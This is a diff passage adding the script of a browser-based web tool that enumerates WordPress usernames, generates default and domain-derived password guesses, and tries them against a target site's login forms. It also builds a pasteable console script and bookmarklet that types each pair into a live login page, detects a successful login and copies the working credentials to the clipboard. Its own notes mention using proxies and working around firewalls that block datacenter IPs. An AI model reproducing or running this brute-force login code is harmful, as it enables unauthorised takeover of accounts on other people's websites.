+  }
+
+  var r = await grab(abs('/wp-json/wp/v2/users?per_page=100'));
+  if (r.status === 200 && /^\s*\[/.test(r.body || '')){
+    try { JSON.parse(r.body).forEach(function(u){ add(u.slug, 'wp-json'); }); } catch (e){}
+  }
+
+  var sm = await grab(abs('/wp-sitemap-users-1.xml'));
+  if (sm.status === 200 && sm.body){
+    (sm.body.match(/\/author\/([^/"<\s]+)/g) || []).forEach(function(m){
+      add(decodeURIComponent(m.replace('/author/', '')), 'wp-sitemap');
+    });
+  }
+
+  for (var i = 1; i <= (document.getElementById('deep').checked ? 6 : 3); i++){
+    var ar = await grab(abs('/?author=' + i));
+    if (ar.status && /author-\d+/.test(ar.body || '')){
+      var m = (ar.body || '').match(/\/author\/([a-z0-9\-_.]+)/i);
+      if (m) add(m[1], 'author-redirect');
+    }
+    await sleep(CFG.delay);
+  }
+
+  var home = await grab(S.root);
+  (home.body || '').replace(/mailto:([\w.\-]+)@/g, function(_, u){ add(u, 'mailto'); return ''; });
+
+  return found;
+}
+
+function buildCandidates(users){
+  var base = rootWord();
+  var seen = {};
+  var out = [];
+
+  function push(u, p, src, weight){
+    var key = u + ':' + p;
+    if (seen[key] || out.length >= CFG.maxCandidates) return;
+    seen[key] = 1;
+    out.push({ username:u, password:p, source:src, weight:weight });
+  }
+
+  (S.tech.length ? S.tech : ['generic']).forEach(function(tech){
+    (DEFAULTS[tech] || []).forEach(function(pair){
+      push(pair[0], pair[1], 'default:' + tech, 90);
+    });
+  });
+
+  var pool = [base, base + '123', base + '1', base + '@123', base + '!',
+    base.charAt(0).toUpperCase() + base.slice(1) + '123',
+    base + '2024', base + '2025', base + '2026', base + '@2026', base + '#123'];
+  pool = pool.concat(PW_SEEDS);
+
+  var hp = hostParts();
+  var locals = [];
+  hp.labels.forEach(function(l){ if (l && locals.indexOf(l) === -1) locals.push(l); });
+  if (hp.reg) locals.push(hp.reg.split('.')[0]);
+  locals.forEach(function(l){
+    pool.unshift(l + '123', l + '@123', l.charAt(0).toUpperCase() + l.slice(1) + '123',
+      l + '2026', l + '@2026');
+  });
+
+  if (S.emailMode){
+    var mails = [];
+    locals.forEach(function(l){ mails.push('admin@' + l, 'info@' + l); });
+    EMAIL_SEEDS.forEach(function(s){
+      if (hp.host) mails.push(s + '@' + hp.host);
+      if (hp.reg) mails.push(s + '@' + hp.reg);
+    });
+    var pwset = [base + '123', base + '@123', base + '2026', 'Admin@123', 'admin'];
+    mails.forEach(function(m){
+      pwset.forEach(function(pw, j){ push(m, pw, 'host-email', 88 - j * 4); });
+      push(m, m, 'email=self', 55);
+    });
+  }
+
+  users.slice(0, 12).forEach(function(u){
+    pool.slice(0, 14).forEach(function(p){ push(u, p, 'harvested-user', 70); });
+    push(u, u, 'user=pass', 60);
+    if (S.emailMode && hp.host && u.indexOf('@') === -1) push(u + '@' + hp.host, u, 'harvested-email', 72);
+  });
+
+  USER_SEEDS.forEach(function(u){
+    pool.slice(0, 10).forEach(function(p){ push(u, p, 'generic', 40); });
+  });
+
+  out.sort(function(a, b){ return b.weight - a.weight; });
+  return out;
+}
+
+async function tryLogin(form, user, pw){
+  var data = {};
+  Object.keys(form.fields).forEach(function(k){ data[k] = form.fields[k]; });
+  data[form.userField] = user;
+  data[form.pwField] = pw;
+  try {
+    var r = await postThrough(form.action, data);
+    var body = (r.body || '').slice(0, 300000);
+    var okHits = (body.match(OK_MARK) || []).length;
+    var badHits = (body.match(BAD_MARK) || []).length;
+    var score = 0;
+    var ev = [];
+    if (okHits){ score += Math.min(okHits * 14, 45); ev.push(okHits + ' success marker(s)'); }
+    if (badHits){ score -= Math.min(badHits * 11, 40); }
+    if (!okHits && !badHits) ev.push('no marker');
+    if (r.status === 200 && !okHits) score -= 5;
+    if (score >= 14) ev.push('http ' + r.status);
+    return { score: Math.max(score, 0), evidence: ev.join('; ') };
+  } catch (e){
+    return { score: 0, evidence: 'post failed: ' + String(e.message || e) };
+  }
+}
+
+function findForm(html, url){
+  var doc = new DOMParser().parseFromString(html, 'text/html');
+  var forms = doc.querySelectorAll('form');
+  for (var i = 0; i < forms.length; i++){
+    var f = forms[i];
+    if (!f.querySelector('input[type=password]')) continue;
+    var fields = {}, userField = null;
+    f.querySelectorAll('input').forEach(function(inp){
+      var n = inp.name;
+      if (!n) return;
+      var t = (inp.type || 'text').toLowerCase();
+      if (t === 'password') fields[n] = '';
+      else if (t === 'hidden') fields[n] = inp.value || '';
+      else if (!userField && /user|login|email|account/i.test(n)) userField = n;
+    });
+    if (!userField){
+      var txt = f.querySelector('input[type=text],input[type=email]');
+      if (txt && txt.name) userField = txt.name;
+    }
+    var pwField = Object.keys(fields).filter(function(k){ return k !== userField; })[0];
+    if (!userField || !pwField) continue;
+    var action = f.getAttribute('action') || url;
+    try { action = new URL(action, url).href; } catch (e){ action = url; }
+    return { action:action, userField:userField, pwField:pwField, fields:fields };
+  }
+  return null;
+}
+
+async function verify(creds){
+  var targets = S.forms.slice(0, 3);
+  var max = parseInt($('#maxa').value, 10) || 16;
+  log('verifying against ' + targets.length + ' form(s), max ' + max + ' tries');
+  note('Cross-origin POSTs cannot see redirects, and SPA logins ignore form POSTs entirely. Treat this as a smoke test — the in-page tester is authoritative.');
+
+  for (var t = 0; t < targets.length; t++){
+    var page = await grab(targets[t]);
+    var form = findForm(page.body || '', targets[t]);
+    if (!form){ log('no usable form at ' + targets[t]); continue; }
+    log('form: ' + form.action + ' [' + form.userField + '/' + form.pwField + ']');
+    var tries = 0;
+    for (var c = 0; c < creds.length && tries < max && !S.aborted; c++){
+      tries++;
+      var res = await tryLogin(form, creds[c].username, creds[c].password);
+      if (res.score >= 14){
+        addFlagged({ username:creds[c].username, password:creds[c].password,
+          target:targets[t], score:res.score, evidence:res.evidence });
+        log('flag ' + creds[c].username + ':' + creds[c].password + ' (' + res.score + ')', 'g');
+      }
+      await sleep(CFG.delay);
+    }
+  }
+}
+
+/* ============================================================
+   4b. IN-PAGE TESTER (DOM-DRIVEN, SPA SAFE)
+   ============================================================ */
+function parsePaste(){
+  var raw = $('#paste').value.trim();
+  if (!raw){ log('nothing pasted', 'e'); return null; }
+
+  Object.keys(SIGS).forEach(function(t){
+    if (S.tech.indexOf(t) > -1) return;
+    if (SIGS[t].some(function(re){ return re.test(raw); })) S.tech.push(t);
+  });
+  S.spa = SPA_MARK.test(raw);
+  var beacon = raw.match(/version["']?\s*:\s*["']([\d.]+)["']/i);
+  if (beacon) log('bundle version: ' + beacon[1]);
+
+  var doc = new DOMParser().parseFromString(raw, 'text/html');
+  var f = null;
+  doc.querySelectorAll('form').forEach(function(x){
+    if (!f && x.querySelector('input[type=password]')) f = x;
+  });
+  if (!f){ $('#fields').textContent = 'no password field found in the pasted HTML'; return null; }
+  var pw = f.querySelector('input[type=password]');
+  var user = f.querySelector('input[type=email]') ||
+    f.querySelector('input[type=text]') ||
+    Array.prototype.find.call(f.querySelectorAll('input'),
+      function(i){ return /user|login|email|account/i.test(i.name || ''); });
+  if (!pw || !user){
+    $('#fields').textContent = 'password field found, but no username field';
+    return null;
+  }
+
+  var hidden = [];
+  f.querySelectorAll('input[type=hidden]').forEach(function(i){
+    if (i.name) hidden.push(i.name);
+  });
+
+  S.pasteForm = {
+    action: f.getAttribute('action') || '',
+    method: (f.getAttribute('method') || 'POST').toUpperCase(),
+    user: user.name, pw: pw.name, hidden: hidden
+  };
+  S.spa = S.spa || !S.pasteForm.action;
+  S.emailMode = (user.type === 'email') || /email/i.test(user.name || '') ||
+    /type=["']email["']/i.test(raw);
+
+  $('#fields').innerHTML = 'action <b>' + esc(S.pasteForm.action || '(page url — SPA)') + '</b><br>method ' +
+    esc(S.pasteForm.method) + ' · user field <b>' + esc(S.pasteForm.user) +
+    '</b> · pass field <b>' + esc(S.pasteForm.pw) + '</b>' +
+    (hidden.length ? ' · hidden: ' + esc(hidden.join(', ')) : '') +
+    (S.emailMode ? '<br><b style="color:var(--warn)">email login — email-shaped candidates will be generated</b>' : '') +
+    (S.spa ? '<br><b style="color:var(--warn)">SPA — the tester types into the live form instead of POSTing</b>' : '');
+
+  log('paste parsed: ' + S.pasteForm.user + ' / ' + S.pasteForm.pw, 'g');
+  $('#t-state').textContent = S.spa ? 'spa mode' : 'ready';
+
+  if (!S.creds.length){
+    var c = buildCandidates([]);
+    S.creds = [];
+    $('#creds').innerHTML = '<div class="empty">nothing yet</div>';
+    c.forEach(addCred);
+    log(c.length + ' candidates rebuilt for this form', 'g');
+  }
+  return S.pasteForm;
+}
+
+function testerSource(){
+  var pairs = S.creds.map(function(c){ return [c.username, c.password]; });
+  if (!pairs.length){ log('generate candidates first', 'e'); return null; }
+  var pf = S.pasteForm || {};
+  var uf = pf.user || '';
+  var pwf = pf.pw || '';
+
+  return 'javascript:(async()=>{' +
+  'const C=' + JSON.stringify(pairs) + ';const UF=' + JSON.stringify(uf) +
+  ';const PF=' + JSON.stringify(pwf) + ';const K="__arhits";' +
+  'let hits=[];try{hits=JSON.parse(localStorage.getItem(K)||"[]");}catch(_){}' +
+  'const docs=()=>{const d=[document];for(const f of document.querySelectorAll("iframe")){' +
+  'try{if(f.contentDocument)d.push(f.contentDocument);}catch(_){}}return d;};' +
+  'const q=(s)=>{for(const d of docs()){const e=d.querySelector(s);if(e)return e;}return null;};' +
+  'const p=(PF&&q(`input[name="${PF}"]`))||q("input[type=password]");' +
+  'if(!p){console.warn("NO PASSWORD FIELD — docs scanned: "+docs().length);return;}' +
+  'const u=(UF&&q(`input[name="${UF}"]`))||q("input[type=email]")||q("input[type=text]");' +
+  'if(!u){console.warn("NO USERNAME FIELD");return;}' +
+  'const root=p.closest("form")||p.ownerDocument;' +
+  'const btn=root.querySelector&&(root.querySelector("button[type=submit],input[type=submit]")||' +
+  '[...root.querySelectorAll("button,[role=button],a")].find(e=>' +
+  '/log ?in|sign ?in|submit|continue|enter/i.test(e.textContent||"")));' +
+  'console.log("%cSTART","font-weight:bold","user:",u.name||u.type,"| pass:",p.name,' +
+  '"| button:",btn?(btn.outerHTML||"").slice(0,80):"NONE","| creds:",C.length);' +
+  'if(!btn)console.warn("no submit control — will dispatch Enter + submit event");' +
+  'const set=(el,v)=>{const d=Object.getOwnPropertyDescriptor(el.constructor.prototype,"value");' +
+  'd.set.call(el,v);el.dispatchEvent(new Event("input",{bubbles:true}));' +
+  'el.dispatchEvent(new Event("change",{bubbles:true}));el.dispatchEvent(new Event("blur",{bubbles:true}));};' +
+  'const snapK=()=>Object.keys(localStorage).length+"|"+Object.keys(sessionStorage).length;' +
+  'const here=location.href;const k0=snapK();' +
+  'const BAD=/invalid|incorrect|wrong|not found|failed|unauthori[sz]ed|mismatch|does not exist|not exist/i;' +
+  'const GOOD=/logout|sign out|log out|dashboard|my account|profile|welcome/i;' +
+  'let n=0;' +
+  'for(const [a,b] of C){n++;' +
+  'set(u,a);set(p,b);await new Promise(r=>setTimeout(r,120));' +
+  'if(btn){btn.click();}else{' +
+  'p.dispatchEvent(new KeyboardEvent("keydown",{key:"Enter",keyCode:13,which:13,bubbles:true}));' +
+  'if(root.requestSubmit)try{root.requestSubmit();}catch(_){}}' +
+  'let v="none";const t0=Date.now();' +
+  'while(Date.now()-t0<6000){await new Promise(r=>setTimeout(r,160));' +
+  'if(location.href!==here){v="nav";break;}' +
+  'if(snapK()!==k0){v="store";break;}' +
+  'const tail=(p.ownerDocument.body.innerText||"").slice(-2500);' +
+  'if(BAD.test(tail)){v="bad";break;}' +
+  'if(GOOD.test(tail)&&!q("input[type=password]")){v="okx";break;}}' +
+  'if(v!=="bad"&&v!=="none"){hits.push([a,b,v,location.href]);' +
+  'try{localStorage.setItem(K,JSON.stringify(hits));}catch(_){}' +
+  'console.log("%cHIT "+a+":"+b+" ["+v+"]","color:#0a0;font-weight:bold;font-size:14px");' +
+  'try{await navigator.clipboard.writeText(hits.map(h=>h[0]+":"+h[1]).join("\\n"));}catch(_){}break;}' +
+  'if(n%5===0)console.log("tried "+n+"/"+C.length+" last="+a+" verdict="+v);' +
+  'await new Promise(r=>setTimeout(r,320));}' +
+  'console.log("%c"+hits.length+" hit(s) after "+n+" tries","font-weight:bold");' +
+  'if(hits.length)console.table(hits);' +
+  '})();';
+}
+
+async function copyTester(){
+  if (!S.pasteForm && !S.forms.length){
+    log('parse a pasted login page first, or run a scan that finds a form', 'e');
+    return;
+  }
+  if (!S.creds.length){ log('generate candidates first', 'e'); return; }
+  var src = testerSource();
+  if (!src) return;
+  try {
+    await navigator.clipboard.writeText(src);
+    log('tester copied — open the login page, F12, console, paste, Enter', 'g');
+    note('The tester auto-discovers the live fields and clicks the real submit control, so SPAs and CSRF tokens both work. It stays on the page and stops at the first hit. Reload the login page before running again.');
+  } catch (e){ log('clipboard blocked', 'e'); }
+}
+
+async function copyBookmarklet(){
+  if (!S.creds.length){ log('generate candidates first', 'e'); return; }
+  var src = testerSource();
+  if (!src) return;
+  if (src.length > 60000){ log('list too long for a bookmarklet — use the console script', 'e'); return; }
+  try {
+    await navigator.clipboard.writeText(src);
+    log('bookmarklet copied (' + src.length + ' chars) — paste it as a bookmark URL', 'g');
+  } catch (e){ log('clipboard blocked', 'e'); }
+}
+
+function diagSource(){
+  return 'javascript:(()=>{' +
+  'const o={url:location.href,iframes:document.querySelectorAll("iframe").length,inputs:[],buttons:[],apis:[],storage:null,formHtml:null};' +
+  'document.querySelectorAll("input").forEach(i=>o.inputs.push([i.type,i.name,i.id,i.placeholder,(i.value||"").slice(0,30)]));' +
+  'document.querySelectorAll("button,[role=button]").forEach(b=>o.buttons.push((b.textContent||"").trim().slice(0,40)));' +
+  'try{performance.getEntriesByType("resource").forEach(e=>{if(/api|auth|login|session|token/i.test(e.name))o.apis.push(e.name);});}catch(_){}' +
+  'o.storage=[Object.keys(localStorage),Object.keys(sessionStorage)];' +
+  'const f=document.querySelector("input[type=password]");' +
+  'o.formHtml=f?(f.closest("form")?f.closest("form").outerHTML.slice(0,1200):"PASSWORD OUTSIDE FORM"):"NO PASSWORD FIELD";' +
+  'console.log(JSON.stringify(o,null,2));' +
+  'try{navigator.clipboard.writeText(JSON.stringify(o,null,2));}catch(_){}' +
+  'console.log("%cdiagnostic copied","color:#0a0;font-weight:bold");' +
+  '})();';
+}
+
+async function copyDiag(){
+  try {
+    await navigator.clipboard.writeText(diagSource());
+    log('diagnostic copied — run it on the login page and paste the console output', 'g');
+  } catch (e){ log('clipboard blocked', 'e'); }
+}
+
+/* ============================================================
+   5. ORCHESTRATOR
+   ============================================================ */
+async function runScan(rawUrl){
+  resetUI();
+  $('#go').disabled = true;
+  $('#stop').disabled = false;
+  setState('running', 'var(--acc)');
+
+  S.root = normalize(rawUrl);
+  try { S.root = new URL(S.root).origin + '/'; }
+  catch (e){
+    log('bad url', 'e');
+    setState('error', 'var(--bad)');
+    $('#go').disabled = false; $('#stop').disabled = true;
+    return;
+  }
+
+  log('target: ' + S.root, 't');
+  await healthCheck();
+
+  var base = await grab(S.root);
+  if (!base.status){
+    log('transport failed: ' + base.err, 'e');
+    var http = S.root.replace(/^https:/, 'http:');
+    log('retrying over plain http');
+    base = await grab(http);
+    if (base.status) S.root = http;
+  }
+
+  if (!base.status){
+    log('unreachable: ' + base.err, 'e');
+    note('Proxies cannot reach this host — usually a WAF blocking datacenter IPs. Paste the login page HTML into the tester below and run the script in your own browser.');
+    setState('needs tester', 'var(--warn)');
+    $('#t-state').textContent = 'required';
+    $('#go').disabled = false; $('#stop').disabled = true;
+    return;
+  }
+
+  log('baseline HTTP ' + base.status);
+  if (base.status >= 500){
+    addFinding({ kind:'status', url:S.root, detail:'HTTP ' + base.status + ' at origin', severity:'medium' });
+    note('Origin returned ' + base.status + ' — the site itself is unhealthy. Path probing continues, but expect gaps. If the app still works in your browser, use the tester.');
+    $('#t-state').textContent = 'recommended';
+  }
+  await fingerprint(base);
+
+  if (SPA_MARK.test(base.body || '')){
+    S.spa = true;
+    log('SPA detected — form POSTs will not authenticate, use the tester', 't');
+  }
+
+  await parseRobots();
+  await probePaths(document.getElementById('deep').checked ? DEEP_PATHS : ADMIN_PATHS);
+  await checkExposed();
+  var users = await harvestUsers();
+
+  if (!users.length) log('no usernames exposed — generic seeds only');
+  S.creds = [];
+  $('#creds').innerHTML = '<div class="empty">nothing yet</div>';
+  var cands = buildCandidates(users);
+  cands.forEach(addCred);
+  log(cands.length + ' candidates generated');
+
+  if (!S.tech.length && !S.forms.length){
+    log('no fingerprint and no form — list is blind, use the tester', 't');
+    $('#t-state').textContent = 'required';
+  }
+
+  if ($('#verify').checked && S.forms.length && !S.spa) await verify(cands);
+  else if (S.spa) log('verification skipped — SPA login, tester is authoritative');
+  else if ($('#verify').checked) log('no login form found — skipped verification');
+
+  setState(S.aborted ? 'stopped' : 'complete', S.aborted ? 'var(--warn)' : 'var(--ok)');
+  log('done — ' + S.findings.length + ' findings, ' + S.creds.length +
+      ' candidates, ' + S.flagged.length + ' flagged', 'g');
+  $('#go').disabled = false;
+  $('#stop').disabled = true;
+}
+
+/* ============================================================
+   6. WIRING
+   ============================================================ */
+$('#go').addEventListener('click', function(){
+  var v = $('#url').value.trim();
+  if (!v){ log('enter a domain first', 'e'); return; }
+  runScan(v);
+});
+
+$('#url').addEventListener('keydown', function(e){
+  if (e.key === 'Enter') $('#go').click();
+});
+
+$('#stop').addEventListener('click', function(){
+  S.aborted = true;
+  setState('stopping', 'var(--warn)');
+});
+
+$('#copy').addEventListener('click', function(){
+  var txt = S.creds.map(function(c){ return c.username + ':' + c.password; }).join('\n');
+  navigator.clipboard.writeText(txt).then(function(){
+    log('copied ' + S.creds.length + ' pairs', 'g');
+  }).catch(function(){ log('clipboard blocked', 'e'); });
+});
+
+function download(name, text, type){
+  var a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([text], { type:type }));
+  a.download = name;
+  a.click();
+  setTimeout(function(){ URL.revokeObjectURL(a.href); }, 2000);
+}
+
+$('#csv').addEventListener('click', function(){
+  var rows = [['username','password','source','worked']].concat(
+    S.creds.map(function(c, i){
+      var tr = document.querySelectorAll('#creds tbody tr')[i];
+      return [c.username, c.password, c.source,
+        tr && tr.classList.contains('done') ? 'yes' : ''];
+    }));
+  download('creds.csv', rows.map(function(r){
+    return r.map(function(v){ return '"' + String(v).replace(/"/g, '""') + '"'; }).join(',');
+  }).join('\n'), 'text/csv');
+});
+
+$('#json').addEventListener('click', function(){
+  download('report.json', JSON.stringify({
+    target: S.root, tech: S.tech, spa: S.spa, findings: S.findings,
+    form: S.pasteForm, credentials: S.creds, flagged: S.flagged
+  }, null, 2), 'application/json');
+});
+
+$('#usePaste').addEventListener('click', parsePaste);
+$('#mkTester').addEventListener('click', copyTester);
+$('#mkBookmark').addEventListener('click', copyBookmarklet);
+$('#mkDiag').addEventListener('click', copyDiag);
+
+$('#ckey').addEventListener('change', healthCheck);
+$('#proxy').addEventListener('change', renderPills);
+healthCheck();
+
+document.querySelectorAll('.selectable').forEach(function(el){
+  el.addEventListener('dblclick', function(){
+    el.style.userSelect = 'text';
+    el.style.webkitUserSelect = 'text';
+  });
+});
+</script>
+
+<noscript>
+  <div style="padding:20px;color:#f45b69">JavaScript is required for this tool.</div>
+</noscript>
+</body>
+</html>
